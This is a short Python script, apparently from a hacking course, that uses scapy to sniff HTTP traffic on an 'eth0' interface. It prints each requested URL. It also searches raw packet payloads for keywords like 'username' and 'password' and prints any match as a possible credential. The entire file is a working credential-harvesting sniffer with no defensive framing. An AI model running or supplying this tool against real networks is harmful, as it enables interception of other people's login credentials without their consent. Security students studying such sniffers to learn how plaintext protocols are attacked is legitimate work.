#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    # for every packet captured, execute process_sniffed_packet
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP request >> " + url.decode())
        login_info = get_login_info(packet)
        if login_info:
            print("[+] Possible username/password > " + login_info + "\n\n")


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "login", "password", "pass", "uname"]
        for keyword in keywords:
            if keyword in load:
                return load


sniff("eth0")
